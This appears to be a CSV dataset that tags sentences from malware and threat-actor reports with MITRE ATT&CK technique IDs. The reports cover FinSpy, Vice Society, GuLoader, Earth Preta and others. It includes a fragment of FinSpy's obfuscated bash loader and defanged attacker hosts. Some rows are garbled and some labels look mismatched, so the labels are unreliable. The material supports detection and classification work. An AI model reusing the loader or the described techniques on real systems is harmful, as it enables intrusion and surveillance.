"[M1016],[M1051]. Execution Technique Title ID Use Recommendation Command and Scripting Interpreter: PowerShell T1059.001 The actors ran PowerShell commands that added an exclusion rule to Windows Defender.",T1562.001
[DS0002]. Scheduled Task/Job: Scheduled Task T1053.005,T1053.005
"The actors’ exploit payload created Scheduled Task RuntimeBrokerService.exe, which executed RuntimeBroker.exe daily as SYSTEM.",T1053.005
[DS0003]. Valid Accounts: Default Accounts T1078.001,T1078
The actors used built-in Windows user account DefaultAccount.,T1078
Develop rules to monitor logon behavior across default accounts that have been activated or logged into [DS0028]. Defense Evasion Technique Title ID Use Recommendations Impair Defenses: Disable or Modify Tools T1562.001,T1562.001
The actors added an exclusion rule to Windows Defender.,T1562.001
"The tool allowlisted the entire c:\drive, enabling the actors to bypass virus scans for tools they downloaded to the c:\drive.",T1562.001
The actors manually disabled Windows Defender via the GUI.,T1562.001
Indicator Removal on Host: File Deletion T1070.004,T1070.004
The actors removed malicious file mde.ps1 from the dis. Detection:,T1070.004
The actors were observed trying to dump LSASS process.,T1003.001
[DS0017]. Credentials from Password Stores T1555 The actors used Mimikatz to harvest credentials.,T1003.001
Remote Desktop Protocol T1021.001 The actors used RDP to move laterally to multiple hosts on the network.,T1021.001
"Other factors, such as access patterns (ex: multiple systems over a relatively short period of time) and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP [DS0028]. Command and Control Technique Title ID Use Recommendations Proxy T1090 The actors used Ngrok to proxy RDP connections and to perform command and control.","T1090, T1021.001"
[DS0029]. Ingress Tool Transfer T1105,T1105
"The actors downloaded malware and multiple tools to the network, including PsExec, Mimikatz, and Ngrok.",T1105
"The decryption key is the EFI system partition GUID, which differs from one machine to another.",T1140
"The patched launcher: Patches the function of the OS loader that transfers execution to the kernel The patched function hooks the kernel’s PsCreateSystemThread function, which, when called for the first time, creates an additional thread that decrypts the next loader stage and launches it.","T1106, T1140"
The next stage: Locates the Trojan loader file on the EFI partition and decrypts it Waits until a user logs on and injects the Trojan loader into exe.,"T1055, T1140"
The Trojan loader: Extracts the Trojan from resources and drops it under the name dll Decrypts the Trojan with a XOR-based cipher and unpacks it with aPLib Reflectively loads and launches the Trojan.,"T1027, T1140"
The last hook in the chain creates a thread in the kernel that injects the next stage into winlogon.exe.,T1055
It is as follows: A thread with trampoline shellcode is created inside exe.,T1055
This roundabout way of injecting code is intended to trick security solutions.,T1055
The injected Trojan loader is the same as the UEFI one.,T1055
"In short, the attack scenario is as follows:",T1204.002
The victim downloads a Trojanized application and executes it.,T1204.002
The Pre-Validator downloads Security Shellcodes from the C2 server and executes them.,T1105
Each shellcode collects specific system information (e.g. the current process name) and uploads it back to the server.,"T1041, T1057, T1082"
"The Post-Validator collects information that allows it to identify the victim machine (running processes, recently opened documents, screenshots) and sends it to a C2 server specified in its configuration.","T1005, T1057, T1113"
"Overview of the user mode infection Trojanized applications Throughout our research, we identified numerous legitimate applications backdoored with FinSpy.",T1072
"Examples include software installers (e.g. TeamViewer, VLC Media Player, WinRAR) as well as portable applications.",T1219
"While the entry point function of the application looks clear, inspection of the executable’s PE file sections does reveal anomalies: the backdoored application has its last section (.rsrc on the screenshot below) expanded by 51 KB. Sections of the original (left) and backdoored (right) application Apart from that, a part of code from the .text section (roughly 8 KB) is overwritten with heavily obfuscated code, with the original application code placed in the expanded last section.",T1027
"When the backdoored application launches, it runs as normal, i.e. the inserted obfuscated code does not impact the application workflow.",T1027
At some point the application executes a jump instruction that redirects execution to the obfuscated trampoline in the .text section.,T1027
"For example, a call to the CreateWindowExW function has been replaced: The original (left) and patched (right) code of the backdoored application This trampoline is protected with an obfuscator that we dubbed FinSpy Mutator.","T1027, T1106"
It launches a code that: Decrypts and launches a slightly modified Metasploit Reverse HTTPS stager.,"T1140, T1071.001"
"The decryption procedure: Is obfuscated with FinSpy Mutator Involves applying 10 operations (ADD, SUB, XOR, ROL, ROR) to every byte of the stager Is different in every backdoored installer.","T1027, T1140"
The Metasploit stager connects to a configured C2 server using HTTPS for communication.,T1071.001
"On startup, it: Hooks the NtTerminateProcess and ExitProcess functions to make sure the Pre-Validator continues working if the backdoored application is closed.",T1106
The hooked functions close all the application’s windows but do not terminate its process.,T1071.001
Makes an initial POST request to the C2 server.,T1071.001
All communications between the server are encrypted with RC4.,T1573.001
"On receiving it, the Pre-Validator: Decrypts and executes the received Security Shellcode Sends the shellcode execution results to the C2 server via a POST request.","T1041, T1140, T1071.001"
"The received shellcodes are protected with either FinSpy Mutator, an obfuscator resembling OLLVM or both these protectors.",T1027
"3 Returns the user’s profile folder (e.g. C:\Users\username) 4 Returns the short form of the user’s profile folder (e.g. C:\Users\abcdef~1) 5 Returns the type of the drive containing the backdoored application (e.g. removable drive) 6 Returns process names of the current process tree (i.e. the current process, the parent process, the grandparent process, etc.) 7 Returns the path to the ‘Program Files’ folder.","T1083, T1057"
", returns: Overall available space Space available to current user (may be less than overall available space due to quotas) Disk capacity 9 Returns the path to the user’s temporary folder. 10 Returns the list of network adapter types, IP and MAC addresses assigned to them. 11 Returns the list of running processes 12 Returns ProcessDebugPort value returned by NtQueryInformationProcess for current process. 13 Returns ProcessDebugObjectHandle value returned by NtQueryInformationProcess for current process. 14 Returns TotalNumberOfObjects and TotalNumberOfHandles values of objects created by NtCreateDebugObject.","T1057, T1083, T1016, T1082"
15 Returns the current user’s SID.,T1033
17 Returns OSVERSIONINFOEXW and SYSTEM_INFO structures.,T1082
18 Returns information about the machine’s BIOS.,T1082
19 Returns the list of object names in the \GLOBAL??,T1083
directory.,T1083
20 Returns information about the operating system.,T1082
"21 Returns the current user’s name, computer name, path to the current executable, its name and command line path.","T1033, T1082"
27 Returns information about the computer system (from SELECT *,T1082
FROM Win32_ComputerSystem WMI query) 28 Returns the list of connected PCI devices. 29 Returns names of shortcuts in the Desktop directory.,"T1047, T1083"
32 Returns the current domain SID.,T1033
"33 Cleans API functions potentially hooked by security solutions: Nt* functions in ntdll.dll and all exported functions in kernel32.dll, kernelbase.dll and advapi32.dll.",T1562.001
The Post-Validator Installer This module is an obfuscated shellcode.,T1027
The file names are hardcoded in the dropper but are unique for each sample and appear to be randomly generated.,T1053.005
Creates a scheduled task that runs at system startup and launches the Post-Validator Loader via regsvr32 (task action:,T1053.005
The Post-Validator Loader The Post-Validator Loader is a huge (3-9 MB) obfuscated DLL.,T1027
The Task Scheduler launches it at system startup through regsvr32.exe.,T1053.005
Sample scheduled task properties The launched shellcode decrypts the Post-Validator (it is stored in the same file with the shellcode) with RC4 (key: domain SID) and reflectively loads it.,"T1140, T1053.005"
The Post-Validator The Post-Validator is a DLL obfuscated with VMProtect.,T1027
0x8070A0 Retrieve the list of files with data prepared for exfiltration.,T1083
"If the prepared file name is: 201a, obtains the list of processes and sends it to the C2 server. 201b, gets the list of recent files and sends it to the C2 server. 243a, takes a screenshot and uploads it to the C2 server. 0x8054A0, 0x805BA0, 0x8056A0, 0x805DA0, 0x8057A0, 0x805EA0","T1057, T1105, T1083, T1041, T1113"
Commands are used to download and install plugins.,T1105
Commands are used to download and run the Trojan Installer.,T1105
"Afterwards, it drops the following files to it: File name Description <4 random hexadecimal characters>.cab The setup configuration file, which is encrypted with RC4 (key: the name of the working directory).",T1027
Names differ between samples The encrypted VFS file.,T1027
"msvcr90.dll The Trojan bundle, encrypted with XOR and compressed with aPLib. msvcr120d.dll 64-bit Trojan loader.",T1027
"The executable is prepended with 0x4000 random bytes and encrypted with RC4 (key: machine GUID) msvcr140d.dll 32-bit Trojan loader, also prepended with random bytes and encrypted with RC4.",T1027
"Once the working directory is prepared, the Installer launches the Trojan.",T1074.001
"The Initial Loader The Initial Loader is a DLL that is launched on every startup by rundll32.exe (the Trojan adds it to the HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run key, the value name is unique for each sample).","T1547.001, T1218.011"
It is obfuscated with a protector resembling the open source OLLVM obfuscator.,T1027
"The Trojan Loader The 32-bit Trojan Loader, which is launched regardless of the victim machine architecture, checks if it is running on a 64-bit system.",T1082
"The Trojan Loader (either the 32-bit or the 64-bit one): Reads the Trojan bundle file (dll), decrypts it with XOR and unpacks with aPLib.","T1027, T1140"
It is written in Objective-C. An obfuscator similar to OLLVM is used to protect FinSpy for Mac.,T1027
"Additionally, Objective-C selectors that may reveal information about method names contain junk.",T1027
These hooks allow the Trojan to load plugins while decrypting them on the fly.,T1140
The Orchestrator (as well as plugins) are packed with aPLib and encrypted with AES.,T1027
"When the Orchestrator is unpacked, it is reflectively loaded.",T1027
Linux Infection The Linux version of FinSpy is protected with an obfuscator similar to OLLVM.,T1027
"On KDE, it copies a Bash script to either ~/.kde4/Autostart/udev2.sh or ~/.kde/Autostart/udev2.sh.",T1059.003
"CS_FONT_LOAD=$(for i in `echo ${CS_FONT_ID} |sed 's/../& /g'`; do echo ""000000 $i"" | xxd -r; done) fi ${CS_FONT_COLF} ${CS_FONT_SID} && ${CS_FONT_LOAD} > /dev/null 2>&1 && ${CS_FONT_COLF} - > /dev/null 2>&1 unset CS_FONT_ID unset CS_FONT_COLF unset CS_FONT_SID unset CS_FONT_LOAD fi This script decodes the directory path and the Trojan Loader from hexadecimal and executes the “cd <working directory path> && ./<loader",T1140
Reads the Orchestrator file from disk and unpacks it with aPLib.,T1027
It starts the Orchestrator and conceals memory areas that contain the Trojan components’ code and data.,T1027
"Similar to a network worm which infects machines in the local network, the ProcessWorm is injected into all running processes.",T1055
The Communicator module which sends data to the C2 server and receives replies The Hider The Hider is the first launched component of the Backdoor.,T1041
"On startup, the Hider loads a clean copy of ntdll.dll from disk, which is used when calling API functions from this library.",T1106
"After that, it decrypts the Orchestrator, which is stored in the Hider’s resource section.",T1140
It is encrypted with a 256-byte RC4 key.,T1027
The key may vary from one sample to another.,T1573.001
"A snippet of the RC4 key generation function After decrypting and unpacking the Orchestrator, the Hider reflectively loads it.","T1027, T1573.001, T1140"
"It works as follows: The Hider encrypts the Orchestrator’s pages with a cipher based on XOR and ROL operations and assigns the PAGE_NOACCESS attribute to them When the Orchestrator accesses hidden pages, the operating system generates an ACCESS_VIOLATION exception The Hider detects the generated exception through the hook of the KiUserExceptionDispatcher function, which handles dispatching of all exceptions The hooked function decrypts the hidden page and assigns it the PAGE_EXECUTE_READWRITE attribute, thus handling the exception The Hider conceals the unhidden pages again within 30 seconds.","T1027, T1106, T1140"
"When the Orchestrator starts up, it: Hooks its own IAT (import address table) to alter the behavior of WinAPI file manipulation functions.",T1106
The Orchestrator needs these hooks to interact with the VFS.,T1547.001
Sets up persistence by creating an entry in the HKCU\Software\Microsoft\Windows\CurrentVersion\Run registry key.,T1547.001
"Once initialized, the Orchestrator launches its following components, which we will detail below: The application watcher that looks for specific processes and notifies the C2 server when they are started or stopped The ProcessWorm injector that injects the ProcessWorm into processes that are not infected with this component The recording manager thread that controls data to be exfiltrated to the C2 server The C2 server communicator thread.","T1041, T1057, T1055"
"The application watcher The application watcher regularly examines all the processes on the system, looking for applications specified in the Orchestrator configuration.",T1057
"When it detects a starting first (or a stopping last) instance of a process from the list in the configuration, an appropriate event will be reported to the C2 server during heartbeat time.",T1057
"It is notable that the application watcher acquires handles for all running processes on the system, which results in either winlogon.exe or explorer.exe obtaining numerous process handles.",T1057
"Just like the application watcher, the injector regularly obtains the list of running processes.",T1057
"For every process, it verifies whether the ProcessWorm is running inside it and injects the ProcessWorm if needed.",T1055
"The recording manager Over the course of their execution, plugins may save recording files in the working directory (e.g. keylogs, screenshots or printed files).","T1056.001, T1113, T1074.001"
The recording manager is tasked with two duties: Periodically checking whether there are recording files available to be sent to the C2 server Preparing recording files to be uploaded when their download is requested by the C2 server.,T1041
"Every recording file stored in the working directory has the following name format: <plugin prefix><recording type prefix><five-digit random number>.<extension> The plugin prefix, the extension and the recording type prefix depend on the ID of the plugin that created the recording.",T1074.001
Below is a list of the Orchestrator commands: Command ID Description Commands related to recordings 0x8072A0 Upload a recording file with a specified name to the C2 server.,T1041
"0x8076A0, 0x807AA0 Delete a recording with a given filename from the system.",T1070.004
0x8059A0 Uninstall a plugin from the machine.,T1027
Miscellaneous commands 0x8018A0,T1070.004
Uninstall the backdoor.,T1070.004
"This command wipes all the files and registry keys created by the backdoor, as well as restores the MBR and the EFI Windows Boot Manager (provided they were infected) from backups.",T1070.004
"All the virtual files are stored in a single “real” file, which is encrypted with RC4 and has the following structure: File offset Description 0x0 CRC32 checksum of the file (the checksum computation starts from offset 4) VFS entry #1 0x4 ID of the plugin corresponding to the file.",T1573.001
"For example, virtual files can be created or opened via the hooked CreateFileW API.",T1106
The ProcessWorm,T1055
The malware injects the ProcessWorm into all processes running on the system.,T1055
Its main purpose is to extract specific information about running processes and send it to the Orchestrator or the plugins.,T1057
The ProcessWorm is a DLL wrapped in a shellcode and obfuscated with FinSpy VM.,T1027
The ProcessWorm can be injected to processes in two ways – either by spawning a remote thread with the shellcode or by creating an APC (Asynchronous Procedure Call) with the procedure address pointing to the start of the shellcode.,T1055
"While the loader used with the first injection method is simple, the one invoked in case of APC injections is rather interesting.",T1055
The asynchronous procedure places a hook on the NtTestAlert function and then exits.,"T1106, T1055"
"When the process executable is loaded, ntdll.dll will call the NtTestAlert function.",T1106
Its modified version will first call the original NtTestAlert function and then invoke the ProcessWorm reflective loader.,T1106
"Instead, IAT entries point to buffers of randomly generated junk code.",T1027
This code obtains the address of the destination API function by XOR-ing two numbers and then jumps to it.,T1106
"Example of junk code created by the ProcessWorm loader, useful instructions are highlighted in yellow While executing its worm-like activity, the ProcessWorm injects itself into processes created by the process that are already infected with this component.","T1027, T1055"
"To do that, it places a hook on the CreateProcessInternalW API function.",T1106
"If the new process is not created with a DEBUG_PROCESS or a DEBUG_ONLY_THIS_PROCESS flag, the hooked process creation function clears a possible hook of the NtQueueAPCThread function and then uses it to create an APC procedure in the new process.","T1106, T1055"
"When the new process starts up, the ProcessWorm will be loaded with the help of the APC injection loader.",T1055
"It can conceal the malware’s working directory, services, registry keys, C2 server addresses, as well as filter out event logs related to the malicious activity.",T1074.001
The ProcessWorm achieves stealth by hooking low-level API functions (such as NtEnumerateValueKey or NtQuerySystemInformation),T1106
The rest of the malicious activity is dispersed across hooks of various WinAPI functions.,T1106
Examples of such information are typed keystrokes or documents sent to the printer.,"T1005, T1056.001"
"Plugin type and ID Features FileManager (0x02) Upload, download, search, delete files.","T1105, T1083, T1070.004"
"Create file listing recordings CommandShell (0x04) Create remote shell sessions TaskScheduler (0x05) Create different types of recordings (file listings, microphone, screen, webcam) at a specified time by dispatching commands to appropriate plugins MicRecorder (0x10) Livestream the victim’s microphone or capture its recordings.","T1083, T1113"
KeyLogger (0x12) Livestream or record keystrokes SkypeStealer (0x14),T1056.001
"Intercept Skype contacts, chats, calls and transferred files FileModificationRecorder (0x16) Record files which have been modified FileAccessRecorder (0x17) Record files which have been accessed PrintedFilesRecorder (0x18) Steal files which are printed by the victim FileDeletionRecorder (0x19) Record removed files ForensicLauncher (0x20) Gather forensic data by downloading and executing specific utilities.","T1105, T1005"
"(Windows only) VoIPRecorder, VoIPLite (0x21, 0x26) Eavesdrop on, and take screenshots during, online conversations.",T1113
"(Windows only) ClickRecorder (0x22) Capture the screen area around mouse click locations WebcamRecorder (0x23) Take webcam images with a specified frame rate, and livestream or record them.",T1113
"ScreenRecorder (0x24) Take screenshots with a specified frame rate, and livestream or record them.",T1113
"During their 2021 infections, these attackers also exploited vulnerabilities such as PrintNightmare to escalate privileges and spread laterally across targeted networks.",T1068
"Vice Society Technical Details Leak Site Synopsis Over the past year, Vice Society has operated sites on the Tor network using the following .onion address:vsociethok6sbprvevl4dlwbqrzyhxcxaqpvcqt5belwvsuxaxsutyad[.]onion On Oct. 20, the primary .onion address became inactive, while the following site mirror was still active: ssq4zimieeanazkzc5ld4v5hdibi2nzwzdibfh5n5w4pw5mcik76lzyd[.]onion Recently, the header for the group’s blog site bears a striking resemblance to the logo of a popular video game titled “Grand Theft Auto: Vice City” (shown in Figure 8).",T1090
"In HelloKitty’s case, this key is typically obfuscated with AES 256 encryption.",T1027
"As mentioned in our previous report detailing emerging ransomware families in 2021, HelloKitty features multiple flags that could be set as command line arguments, which are detailed in Table 1 of the linked report.",T1059.003
"Upon execution, the ransomware binary deletes itself and drops a ransom note on the victim machine’s desktop titled !!!",T1070.004
Additional execution details include the following: Creating the HKCU\Software\Zeppelin registry key Appending an extension with the format A1A-A80-4CD to encrypted files Creating a file called README.txt.v-society Imphash: 8acb34bed3caa60cae3f08f75d53f727 Creating a temp file with a .Zeppelin extension using the following format - C:\Users\<User>\AppData\Local\Temp\7D3ED7F1.Zeppelin Conclusion School districts with limited cybersecurity capabilities and constrained resources are often the most vulnerable to threat actors.,T1112
T1078 Valid Accounts Compromised valid credentials have been used by Vice Society to gain initial access.,T1078
"T1190 Exploit Public-Facing Applications Internet-facing applications and systems vulnerabilities can be exploited, such as PrintNightmare (CVE-2021-1675) and (CVE-2021-34527), to gain initial access.",T1190
TA0002 Execution T1047 Windows Management Instrumentation (WMI) Malicious commands are executed via WMI as a means of “living off the land” and avoiding detection.,T1047
Scheduled Task/Job Vice Society is known to execute commands via scheduled tasks/jobs.,T1053.005
Command Shell Batch files are used by Vice Society to deploy the ransomware via PsExec.,T1059.003
"TA0003 Persistence T1543.003 Modify System Process To maintain access to compromised systems, Vice Society leverages Windows operating functions to execute encrypted PowerShell.",T1027
T1547.001 Registry Run Keys/Startup Folder Persistence is maintained after boot/reboot via malicious autostart registry keys.,T1547.001
T1574.002 DLL Side-Loading Vice Society utilizes legitimate programs to side-load the group’s own DLL to execute their payload.,T1574.002
"TA0004 Privilege Escalation T1068 Exploitation for Privilege Escalation Software vulnerabilities, such as PrintNightmare (CVE-2021-1675) and (CVE-2021-34527), may be exploited in an attempt to elevate privileges.",T1068
Masquerading Files dropped in the victim’s environment by Vice Society may have been altered to appear legitimate.,T1036.005
"T1055 Process Injection Legitimate processes have been corrupted by Vice Society via code injection, as a means to evade defenses.",T1055
T1112 Modify Registry Vice Society attempts to disable Windows Defender by modifying the Registry.,"T1562.001, T1112"
"Impair Defenses: Disable or Modify Tools Attempts to disable or modify endpoint security, such as Microsoft Defender, on compromised devices.",T1562.001
T1003.001 OS Credential Dumping: LSASS Memory Vice Society utilizes comsvcs.dll to dump credentials from Local Security Authority Subsystem Service.,T1003.001
Remote Services RDP is used by the group for lateral movement.,T1021.001
"T1570 Lateral Tool Transfer Lateral tool transfers have been used to move tools and files from one compromised system to another, including SMB and RDP.",T1570
TA0010 Exfiltration T1020 Automated Exfiltration PowerShell scripts are used to exfiltrate data to external C2 servers.,T1041
T1041 Exfiltration over C2 Channel Tools such as PowerShell and PsExec are used to exfiltrate data directly to C2 servers.,T1041
Remote Access Software Tools such as SystemBC and proprietary backdoors are known to be used by Vice Society.,T1219
"It collects sensitive data from web browsers, email clients, FTP servers and crypto wallets.",T1552.001
The latter are the stealing functions.,T1552.001
"These functions are made to steal credentials from different types of applications and services on the Windows operating system: Browsers: Safari, Internet Explorer, Firefox and Chromium-based browsers FTP/SSH apps and clients Backup applications Email applications Notes applications Poker applications Password managers Windows credentials The main function of the malware is looping over these stealer functions to execute them, as shown in Figure 5. Figure 5.",T1552.001
Rapid adoption of publicly disclosed POCs for initial access and persistence Microsoft has increasingly observed this Mint Sandstorm subgroup adopting publicly disclosed proof-of-concept (POC) code shortly after it is released to exploit vulnerabilities in internet-facing applications.,T1190
"While this subgroup has demonstrated their ability to rapidly incorporate new public POCs into their playbooks, Microsoft has also observed that Mint Sandstorm continues to use older vulnerabilities, especially Log4Shell, to compromise unpatched devices.",T1190
"As this activity is typically opportunistic and indiscriminate, Microsoft recommends that organizations regularly patch vulnerabilities with publicly available POCs, regardless of how long the POC has been available.",T1190
"After gaining initial access to an organization by exploiting a vulnerability with a public POC, this Mint Sandstorm subgroup deploys a custom PowerShell script designed for discovery.",T1190
The two attack chains used by the Mint Sandstorm subgroup Attack chain 1: The Mint Sandstorm subgroup proceeds using Impacket to move laterally through a compromised organization and relies extensively on PowerShell scripts (rather than custom implants) to enumerate admin accounts and enable RDP connections.,T1021.001
"If obtained, the Mint Sandstorm subgroup can use the Active Directory database to access credentials for users’ accounts.",T1078
"In cases where users’ credentials are accessed and the target organization has not reset corresponding passwords, the actors can log in with stolen credentials and masquerade as legitimate users, possibly without attracting attention from defenders.",T1078
The actors could also gain access to other systems where individuals may have reused their passwords.,T1078
"However, in this progression, the operators use webhook.site for C2 and create scheduled tasks for persistence.",T1053.005
"Since 2022,Microsoft has observed this Mint Sandstorm subgroup using two custom implants, detected by Microsoft security products as Drokbk and Soldier, to persist in target environments and deploy additional tools.",T1105
Soldier: Soldier is a multistage .NET backdoor with the ability to download and run additional tools and uninstall itself.,T1105
"In these operations, the group crafts bespoke phishing emails, often purporting to contain information on security policies that affect countries in the Middle East, to deliver weaponized documents to individuals of interest.",T1566.001
"Unlike their initial exploitation of vulnerable internet-facing applications, which is largely indiscriminate and affects organizations across sectors and geographies, activity associated with this campaign was highly targeted and affected fewer than 10 organizations..",T1190
"CharmPower can read files, gather information on an infected host, and send details back to the attackers.","T1083, T1005"
Patching this vulnerability is useful beyond this specific campaign as several adversaries are exploiting CVE-2022-47966 for initial access.,T1190
Apache Log4j2 (aka Log4Shell) (CVE-2021-44228 and CVE-2021-45046): Microsoft’s guidance for organizations using applications vulnerable to Log4Shell exploitation can be found here.,T1190
"In addition, Microsoft Sentinel customers can leverage the following content to hunt for and detect related activity in their environments: Log4J solution Potential Impacket Execution Commands executed by WMI on new hosts – potential Impacket Scheduled Task Hidden Remote Task Creation/Update using Schtasks Process Scheduled Task Creation or Update from User Writable Directory Exchange SSRF Autodiscover ProxyShell – Detection Indicators of compromise IndicatorTypeDescriptionSoldier.exeFile nameSoldier backdoorad55b4a40f9e52682d9d4f069914e09c941e8b77ca7b615e9deffccdfbc54145SHA256Soldier backdoor hashDrokbk.exeFile nameDrokbk backdoor64f39b85c1d784df1ca8eb895ac7eaf47bf39acf008ed4ae27a796ac0f841bSHA256Drokbk","T1047, T1053.005"
"GuLoader is a shellcode-based downloader, known for its numerous anti-analysis techniques and control flow obfuscation.",T1027
"In this blog post, we will discuss Unpacking of GuLoader’s shellcodes.",T1027
Writing an IDAPython script to deobfuscate the control flow of shellcode and to make GuLoader’s analysis easy and fast.,T1140
Currently GuLoader is spreading through malspam campaign and packed using NSIS installer.,T1027
UNPACKING GULOADER’S SHELLCODE GuLoader’s shellcode is executed after three layers.,T1027
"Layer 1: Recent variant of GuLoader is spreading as NSIS Installer consisting of NSIS script, DLL plugin and encrypted shellcode’s file.",T1027
It then calls CallWindowProcW API.,T1106
Layer 2: Malware immediately decrypts the third layer which located at offset 0x1c9 in layer 2 and starts its execution.,T1140
"This shellcode has complex obfuscation, consisting of junk code, indirect function calls, dynamic API resolution, obfuscated arithmetic value calculations, using stack to decrypt strings, fake instructions, anti-debug, anti-vm, anti-analysis, anti-dump, anti-API hook, anti-emulation techniques.","T1027, T1140"
Ultimate goal of GuLoader for using this anti-debug technique is to achieve runtime control flow obfuscation.,T1027
Patch DbgBreakPoint and DbgUiRemoteBreakin API used by debuggers.,T1106
Uses EnumWindows API to enumerates windows.,T1106
Uses NtSetInformationThread API with ThreadHideDebugger(0x11).,T1106
Uses EnumDeviceDrivers and GetDeviceDriverBaseNameA APIs.,T1106
Uses MsiEnumProductsA and MsiGetProductInfoA APIs.,T1106
Uses OpenSCManagerA and EnumServicesStatusA APIs.,"T1106, T1140"
Use NtQueryInformationProcess API with DebugPort(0x7).,T1140
"After successful bypass , it decrypts the c2 URL and download encrypted payload from c2.","T1027, T1140"
Generate the payload decryption key.,T1140
"It decrypts an encrypted payload, use process hollowing to inject decrypted payload into child process and resolves its Import Address Table.","T1027, T1055, T1140"
"Lastly, it starts payload execution using the ZwCreateThreadEx API. Fig 4.",T1106
Snippet of Payload decryption function.,T1140
Writing IDAPython script to restore deobfuscate control flow.,T1140
GuLoader call RtlAddVectoredExceptionHandler API to add its custom Vectored Exception Handler. RtlAddVectoredExceptionHandler accepts two parameters.,T1106
"After running the python script in IDA, we get clean, easy to analyze, deobfuscated code of GuLoader’s shellcode.",T1140
We have written python script to defeat GuLoader shellcode control flow obfuscation and saving time and efforts of malware analyst.,T1027
"Arrival vectors We previously summarized the arrival vectors used by Earth Preta by categorizing them into three types (DLL sideloading, shortcut links, and fake file extensions).",T1574.002
Infection flow for the new arrival vector File name Detection name Description Letter Head.docx Decoy document with Google Drive link List of terrorist personnel IN border.rar (all entries below are part of this archive) List of terrorist personnel at the border.exe First-stage legitimate executable for DLL sideloading libcef.dll Trojan.Win32.TONEINS First-stage malware ~$Evidence information.docx Second-stage legitimate executable for DLL sideloading ~$List of terrorist personnel at the border.docx Backdoor.Win32.TONESHELL Second-stage malware Internal Letter.docx Decoy document Letter Head.docx Decoy document Table 1.,T1574.002
"The infection flow for these is similar to the arrival vector type C in our previous report, with the only difference being that the fake .docx files have XOR-encrypted content to prevent detection.",T1027
"The TONEINS malware, libcef.dll, will decrypt this file with a single byte in XOR operations, find the PE header, and drop the payload to the specified path.",T1140
A PE file is revealed after decrypting the frData member in the last ZIPFILECECORD structure.,T1140
"The decryption function of TONEINS The succeeding behaviors of the infection flow are generally the same as those in our previous analysis, where we provide more details.",T1140
"The data in the HTTP body is the same as the past variant, which has the same magic bytes 17 03 03 and the encrypted victim information.",T1071.001
"C&C traffic of the PUBLOAD HTTP variant Once the payload is received, it will check if the first three magic bytes are 17 03 03 and if the following two bytes are the size of payload.",T1071.001
"It will then decrypt the encrypted payload with the predefined RC4 key 78 5A 12 4D 75 14 14 11 6C 02 71 15 5A 73 05 08 70 14 65 3B 64 42 22 23 20 00 00 00 00 00 00 00, which is the same as the one used in the PUBLOAD loader.",T1140
"The first payload retrieved from the PUBLOAD HTTP variant After decryption, it then checks if the first byte of the decrypted payload is 0x06.","T1140, T1071.001"
The decrypted payload contains another payload that is XOR-encrypted with the bytes 23 BE 84 E1 6C D6 AE 52 90.,"T1027, T1140"
"The second payload retrieved from the PUBLOAD HTTP variant After this is decrypted, there is yet another final backdoor payload that supports data upload and command execution.","T1105, T1059.003, T1140, T1071.001"
The final payload of the PUBLOAD HTTP variant Command Internal string 0x03 - 0x01 - 0x1B UploadBegin error : %d! 0x1D UploadData error : %d! 0x1A - 0x1E CmdStart error : %d! 0x1F CmdWrite error :,T1071.001
"Command codes in the PUBLOAD HTTP variant In addition, we found some interesting debug strings and event names among the PUBLOAD samples.",T1071.001
"Discovery Once the threat actors obtain access to the victim’s environment, they can start inspecting the environment via the following commands: net user net user <username> net user <username>",T1033
"/DOMAIN Privilege escalation In this campaign, we discovered several tools used for UAC bypass in Windows 10.",T1548.002
Win 32.ABPASS HackTool.Win32.ABPASS is a tool used to bypass UAC in Windows 10.,T1548.002
"￼ This tool accepts an argument, and the following data is written into registry: Registry Key Name Value HKEY_USERS\<SID>-1001_Classes\aaabbb32\shell\open\command (Default)",T1112
Registry keys changed by ABPASS,T1112
It also sets up a new ProgID aaabbb32 and its shell open command.,T1059.003
Win 32.CCPASS HackTool.,T1548.002
Win32.CCPASS is another tool that is also used for Windows 10 UAC bypass and similarly reuses codes from the function ucmMsStoreProtocolMethod in the project UACME.,T1548.002
The hack tool CCPASS works as follows: It disables the application association toasts for the protocol ms-windows-store.,T1112
It creates a new Shell in the registry.,"T1106, T1112"
It invokes the undocumented API UserAssocSet to update the file association.,T1106
This service has the highest privileges that can be abused for Windows 10 UAC bypass.,T1548.002
"Lateral movement In this stage, we observed certain malware such as HIUPAN and ACNSHELL (initially introduced and analyzed by Mandiant and Sophos) being used to install themselves to removable disks and create a reverse shell.",T1059.003
"HIUPAN and ACNSHELL infection flow The USB Driver.exe program first sideloads u2ec.dll, which then loads the payload file usb.ini.",T1574.002
"If it is not installed, it installs itself to %programdata% and then sets the registry run key for persistence.",T1112
"Finally, the ACNSHELL malware rzlog4cpp.dll is sideloaded.",T1574.002
It will then create a reverse shell via ncat.exe to the server closed[.]theworkpc[.]com.,T1059.003
"For example, the group used certutil.exe to download the legitimate WinRAR binary as rar1.exe from the server 103[.]159[.]132[.]91. Figure 19.",T1105
The certutil.exe program downloads the WinRAR binary We also observed that the threat actors used PowerShell to download multiple malware and archives from the server 103[.]159[.]132[.]181 for future use. Figure 20.,T1105
"PowerShell downloading malware In certain instances, they even leveraged the WinRAR binary installed on the victim hosts to decompress all the malware.",T1105
This is a simple backdoor that is capable of executing commands and clearing event logs.,T1059.003
"Meanwhile, loader.ja is used under two processes: One is under googleupdate.exe, which is used for the first sideloading.",T1574.002
"The second is under winver.exe, which is injected to conduct backdoor behaviors.",T1055
"Furthermore, COOLCLIENT applies obfuscation techniques that we discuss in later sections. Figure 23.",T1027
"There are three conditions different ways to decide the method of installation for COOLCLIENT, detailed here: It installs itself by creating an InstallSvc service called InstallSvc which will trigger “googleupdate.exe work”..","T1547.001, T1543.003"
It sets up a run key for via the command C:\ProgramData\GoogleUpdate\googleupdate.exe work for persistence. work.,T1547.001
"The malware will continue to read and decrypt goopdate.ja and inject it into winver.exe for the next-stage payload (COOLCLIENT), which contains malicious behaviors.","T1055, T1140"
"If avp.exe doesn’t exist, UAC bypass will be executed via the CMSTPLUA COM interface.",T1548.002
"If avp.exe exists, UAC bypass will be executed via the AppInfo RPC service.",T1548.002
UAC Bypass via the CMSTPLUA COM interface Figure 26.,T1548.002
"UAC Bypass via the AppInfo RPC service Based on the class name used in COOLCLIENT, we learned thaAccording to our analysis, it reads the encrypted configuration filecan expand the C&C server via time.sig., an encrypted configuration.","T1027, T1548.002"
It is also able to communicate through different network protocols such as UDP (User Datagram Protocol) and TCP (Transmission Control Protocol).,T1095
